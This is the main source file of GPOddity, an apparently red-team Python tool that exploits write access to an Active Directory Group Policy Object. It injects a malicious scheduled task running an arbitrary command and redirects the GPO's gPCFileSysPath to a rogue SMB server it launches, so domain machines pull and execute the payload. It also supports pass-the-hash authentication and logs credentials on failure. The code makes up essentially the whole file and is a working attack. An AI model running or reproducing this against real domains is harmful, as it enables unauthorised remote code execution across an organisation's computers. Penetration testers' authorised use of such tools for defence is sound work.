import sys
import typer
import logging
import traceback

from time                           import sleep
from impacket.ntlm                  import compute_lmhash, compute_nthash
from ldap3                          import Server, Connection, NTLM
from typing_extensions              import Annotated

from helpers.smb_utils              import get_smb_connection, download_initial_gpo
from helpers.scheduledtask_utils    import write_scheduled_task
from helpers.gpoddity_smbserver     import SimpleSMBServer
from helpers.version_utils          import update_GPT_version_number
from helpers.clean_utils            import init_save_file, save_attribute_value, clean
from helpers.ldap_utils             import get_attribute, modify_attribute, update_extensionNames

from conf                           import OUTPUT_DIR, bcolors, GPOTypes





def main(
        domain: Annotated[str, typer.Option(help="The target domain", rich_help_panel="General options")],
        gpo_id: Annotated[str, typer.Option(help="The GPO object GUID without enclosing brackets (for instance, '1328149E-EF37-4E07-AC9E-E35920AD2F59') ", rich_help_panel="General options")],
        username: Annotated[str, typer.Option(help="The username of the user having write permissions on the GPO AD object. This may be a machine account (for instance, 'SRV01$')", rich_help_panel="General options")],

        command: Annotated[str, typer.Option(help="The command that should be executed through the malicious GPO", rich_help_panel="Malicious Group Policy Template generation options")] = None,
        rogue_smbserver_ip: Annotated[str, typer.Option(help="The IP address or DNS name of the server that will host the spoofed malicious GPO. If using the GPOddity smb server, this should be the IP address of the current host on the internal network (for instance, 192.168.58.101)", rich_help_panel="Group Policy Template location spoofing options")] = None,
        rogue_smbserver_share: Annotated[str, typer.Option(help="The name of the share that will serve the spoofed malicious GPO (for instance, 'synacktiv'). If you are running the embedded SMB server, do NOT provide names including 'SYSVOL' or 'NETLOGON' (protected by UNC path hardening by default)", rich_help_panel="Group Policy Template location spoofing options")] = None,

        password: Annotated[str, typer.Option(help="The password of the user having write permissions on the GPO AD object", rich_help_panel="General options")] = None,
        hash: Annotated[str, typer.Option(help="The NTLM hash of the user having write permissions on the GPO AD object, with the format 'LM:NT'", rich_help_panel="General options")] = None,

        machine_name: Annotated[str, typer.Option(help="[Optional] The name of a valid domain machine account, that will be used to perform Netlogon authentication (for instance, SRV01$). If omitted, will use the user specified with the --username option, and assume that it is a valid machine account", rich_help_panel="GPOddity smb server options")] = None,
        machine_pass: Annotated[str, typer.Option(help="[Optional] The password of the machine account if specified with --machine-name", rich_help_panel="GPOddity smb server options")] = None,
        machine_hash: Annotated[str, typer.Option(help="[Optional] The NTLM hash of the machine account if specified with --machine-name, with the format 'LM:NT'", rich_help_panel="GPOddity smb server options")] = None,
        comment: Annotated[str, typer.Option(help="[Optional] Share's comment to display when asked for shares", rich_help_panel="GPOddity smb server options")] = None,
        interface: Annotated[str, typer.Option(help="[Optional] The interface on which the GPOddity smb server should listen", rich_help_panel="GPOddity smb server options")] = '0.0.0.0',
        port: Annotated[str, typer.Option(help="[Optional] The port on which the GPOddity smb server should listen", rich_help_panel="GPOddity smb server options")] = '445',

        powershell: Annotated[bool, typer.Option("--powershell", help="[Optional] Use powershell instead of cmd for command execution", rich_help_panel="Malicious Group Policy Template generation options")] = False,
        gpo_type: Annotated[GPOTypes, typer.Option(help="[Optional] The type of GPO that we are targeting. Can either be 'user' or 'computer'", rich_help_panel="Malicious Group Policy Template generation options")] = GPOTypes.computer,

        dc_ip: Annotated[str, typer.Option(help="[Optional] The IP of the domain controller if the domain name can not be resolved.", rich_help_panel="General options")] = None,
        ldaps: Annotated[bool, typer.Option("--ldaps", help="[Optional] Use LDAPS on port 636 instead of LDAP", rich_help_panel="General options")] = False,
        verbose: Annotated[bool, typer.Option("--verbose", help="[Optional] Enable verbose output", rich_help_panel="General options")] = False,
        no_smb_server: Annotated[bool, typer.Option("--no-smb-server", help="[Optional] Disable the smb server feature. GPOddity will only generate a malicious GPT, spoof the GPO location, wait, and cleanup", rich_help_panel="General options")] = False,
        just_clean: Annotated[bool, typer.Option("--just-clean", help="[Optional] Only perform cleaning action from the values specified in the file of the --clean-file flag. May be useful to clean up in case of incomplete exploitation or ungraceful exit", rich_help_panel="General options")] = False,
        clean_file: Annotated[str, typer.Option("--clean-file", help="[Optional] The file from the 'cleaning/' folder containing the values to restore when using --just-clean flag. Relative path from GPOddity install folder, or absolute path", rich_help_panel="General options")] = None
):
    if verbose is False: logging.basicConfig(format='%(message)s', level=logging.WARN)
    else: logging.basicConfig(format='%(message)s', level=logging.INFO)
    logger = logging.getLogger(__name__)
    domain_dn = ",".join("DC={}".format(d) for d in domain.split("."))
    gpo_dn = 'CN={' + gpo_id + '}},CN=Policies,CN=System,{}'.format(domain_dn)
    if dc_ip is None:
        dc_ip = domain

    ### ============================= ###
    ### In case we just want to clean ###
    ### ============================= ###
    
    if just_clean is True:
        if clean_file is None:
            logger.error(f"[!] You provided the --just-clean flag without specifying the --clean-file argument.")
            return
        if username is None and (password is None and hash is None):
            logger.error(f"[!] To perform cleaning, please provide valid credentials for a user having the necessary rights to update the GPO AD object.")
            return
    
        logger.warning(f"\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
        logger.warning("[*] Initiating LDAP connection")
        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
        if hash is not None:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
        clean(ldap_session, gpo_dn, clean_file)
        logger.warning(f"{bcolors.OKGREEN}[+] All done (only cleaning). Exiting...{bcolors.ENDC}")
        return


    ### ============================================= ###
    ### Performing some checks on arguments coherence ###
    ### ============================================= ###

    if gpo_id is None or domain is None or username is None or command is None or (password is None and hash is None) or rogue_smbserver_ip is None or rogue_smbserver_share is None:
        logger.error(f"[!] To run the exploit, you should provide at least a GPO id, a domain, a username and password/hash, a command, a rogue SMB server IP and a rogue SMB server share.")
        return

    if no_smb_server is not True and "sysvol" in rogue_smbserver_share.lower() or "netlogon" in rogue_smbserver_share.lower():
        confirmation = typer.prompt("[!] You requested to run the embedded SMB server, but provided a share name that is by default protected by UNC path hardening. Are you sure you want to continue? [yes/no] ")
        if confirmation != 'yes':
            return
    
    if gpo_type != GPOTypes.computer and no_smb_server is not True:
        confirmation = typer.prompt("[!] You are trying to target a User Group Policy Object while running the embedded SMB server. This will probably not work. Are you sure you want to continue? [yes/no] ")
        if confirmation != 'yes':
            return
    
    if machine_name is None:
        machine_name = username
        machine_pass = password
        machine_hash = hash
    

    
    ### =========================================================================== ###
    ### Generating the malicious Group Policy Template and storing it in OUTPUT_DIR ###
    ### =========================================================================== ###

    logger.warning(f"\n{bcolors.BOLD}=== GENERATING MALICIOUS GROUP POLICY TEMPLATE ==={bcolors.ENDC}\n")

    # Download legitimate GPO
    logger.warning("[*] Downloading the legitimate GPO from SYSVOL")
    try:
        smb_session = get_smb_connection(dc_ip, username, password, hash, domain)
        download_initial_gpo(smb_session, domain, gpo_id)
    except:
        logger.critical(f"[!] Failed to download legitimate GPO from SYSVOL (dc_ip: {dc_ip} ; username: {username} ; password: {password} ; hash: {hash}). Exiting...", exc_info=True)
        sys.exit(1)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully downloaded legitimate GPO from SYSVOL to '{OUTPUT_DIR}' folder{bcolors.ENDC}")

    # Write malicious scheduled task
    logger.warning(f"[*] Injecting malicious scheduled task into downloaded GPO")
    try:
        write_scheduled_task(gpo_type, command, powershell)
    except:
        logger.critical(f"[!] Failed to write malicious scheduled task to downloaded GPO. Exiting...", exc_info=True)
        sys.exit(1)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully injected malicious scheduled task{bcolors.ENDC}")

    
    # Update spoofed GPO version number
    try:
        logger.warning("[*] Initiating LDAP connection")
        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
        if hash is not None:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        logger.warning(f"{bcolors.OKGREEN}[+] LDAP bind successful{bcolors.ENDC}")
        logger.warning(f"[*] Updating downloaded GPO version number to ensure automatic GPO application")
        update_GPT_version_number(ldap_session, gpo_dn, gpo_type)
        logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated downloaded GPO version number{bcolors.ENDC}")
    except:
        logger.critical(f"[!] Failed update downloaded GPO version number (there might be something wrong with the provided LDAP credentials?). Exiting...", exc_info=True)
        sys.exit(1)
    

    ### ================================================================== ###
    ### Spoofing the location of the Group Policy Template to rogue server ###
    ### ================================================================== ###

    logger.warning(f"\n{bcolors.BOLD}=== SPOOFING GROUP POLICY TEMPLATE LOCATION THROUGH gPCFileSysPath ==={bcolors.ENDC}\n")
    
    # Prepare to save value to clean
    save_file_name = init_save_file(gpo_id)
    logger.info(f"[*] The save file for current exploit run is {save_file_name}")

    # Modify gPCFileSysPath
    try:
        smb_path = f'\\\\{rogue_smbserver_ip}\\{rogue_smbserver_share}'
        logger.warning(f"[*] Modifying the gPCFileSysPath attribute of the GPC to '{smb_path}'")
        initial_gpcfilesyspath = get_attribute(ldap_session, gpo_dn, "gPCFileSysPath")
        result = modify_attribute(ldap_session, gpo_dn, "gPCFileSysPath", smb_path)
        if result is not True: raise Exception
    except:
            logger.critical(f"[!] Failed to modify the gPCFileSysPath attribute of the target GPO. Exiting...")
            sys.exit(1)
    save_attribute_value("gPCFileSysPath", initial_gpcfilesyspath, save_file_name)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully spoofed GPC gPCFileSysPath attribute{bcolors.ENDC}")


    # Increment version number
    logger.warning(f"[*] Updating the versionNumber attribute of the GPC")
    try:
        versionNumber = int(get_attribute(ldap_session, gpo_dn, "versionNumber"))
        updated_version = versionNumber + 1 if gpo_type == "computer" else versionNumber + 65536
        result = modify_attribute(ldap_session, gpo_dn, "versionNumber", updated_version)
        if result is not True: raise Exception
    except:
        logger.critical(f"[!] Failed to modify the gPCFileSysPath attribute of the target GPO. Cleaning...")
        clean(ldap_session, gpo_dn, save_file_name)
        logger.critical("[!] Exiting...")
        sys.exit(1)
    save_attribute_value("versionNumber", versionNumber, save_file_name)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC versionNumber attribute{bcolors.ENDC}")

    
    # Update extensionName
    logger.warning(f"[*] Updating the extensionName attribute of the GPC")
    try:
        attribute_name = "gPCMachineExtensionNames" if gpo_type == "computer" else "gPCUserExtensionNames"
        extensionName = get_attribute(ldap_session, gpo_dn, attribute_name)
        updated_extensionName = update_extensionNames(extensionName)
        result = modify_attribute(ldap_session, gpo_dn, attribute_name, updated_extensionName)
        if result is not True: raise Exception
    except:
        logger.critical(f"[!] Failed to modify the extensionName atribute of the target GPO. Cleaning...")
        clean(ldap_session, gpo_dn, save_file_name)
        logger.critical("[!] Exiting...")
        sys.exit(1) 
    save_attribute_value(attribute_name, extensionName, save_file_name)
    logger.warning(f"{bcolors.OKGREEN}[+] Successfully updated GPC extensionName attribute{bcolors.ENDC}")

    try:
        if no_smb_server is not True:
            ### ========================================================== ###
            ### Launching GPOddity SMB server and waiting for GPO requests ###
            ### ========================================================== ###

            logger.warning(f"\n{bcolors.BOLD}=== LAUNCHING GPODDITY SMB SERVER AND WAITING FOR GPO REQUESTS ==={bcolors.ENDC}")
            logger.warning(f"\n{bcolors.BOLD}If the attack is successful, you will see authentication logs of machines retrieving and executing the malicious GPO{bcolors.ENDC}")
            logger.warning(f"{bcolors.BOLD}Type CTRL+C when you're done. This will trigger cleaning actions{bcolors.ENDC}\n")

            if comment is None: comment = ''

            if machine_hash is not None:
                lmhash, nthash = machine_hash.split(':')
            else:
                lmhash = compute_lmhash(machine_pass)
                nthash = compute_nthash(machine_pass)

            server = SimpleSMBServer(listenAddress=interface,
                                                    listenPort=int(port),
                                                    domainName=domain,
                                                    machineName=machine_name)
            server.addShare(rogue_smbserver_share.upper(), OUTPUT_DIR, comment)
            server.setSMB2Support(True)
            server.addCredential(machine_name, 0, lmhash, nthash)
            server.setSMBChallenge('')
            server.setLogFile('')
            server.start()
        else:
            logger.warning(f"\n{bcolors.BOLD}=== WAITING (not launching GPOddity SMB server) ==={bcolors.ENDC}")
            logger.warning("[*] CTRL+C to stop and clean...")
            while True:
                sleep(10)
    except KeyboardInterrupt:
        ### =================================================== ###
        ### Cleaning by restoring previous GPC attribute values ###
        ### =================================================== ###
        logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
        # Reinitialize ldap connection, since cleaning can happen a long time after exploit launch
        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
        if hash is not None:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        clean(ldap_session, gpo_dn, save_file_name)
    except:
        logger.error(traceback.print_exc())
        logger.error(f"{bcolors.FAIL}[!] Something went wrong. Cleaning and exiting...{bcolors.ENDC}\n")
        ### =================================================== ###
        ### Cleaning by restoring previous GPC attribute values ###
        ### =================================================== ###
        logger.warning(f"\n\n{bcolors.BOLD}=== Cleaning and restoring previous GPC attribute values ==={bcolors.ENDC}\n")
        # Reinitialize ldap connection, since cleaning can happen a long time after exploit launch
        server = Server(f'ldaps://{dc_ip}:636', port = 636, use_ssl = True) if ldaps is True else Server(f'ldap://{dc_ip}:389', port = 389, use_ssl = False)
        if hash is not None:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=hash, authentication=NTLM, auto_bind=True)
        else:
            ldap_session = Connection(server, user=f"{domain}\\{username}", password=password, authentication=NTLM, auto_bind=True)
        clean(ldap_session, gpo_dn, save_file_name)




def entrypoint():
    typer.run(main)

    
if __name__ == "__main__":
    typer.run(main)


# TODO
# > Coherence checks on arguments
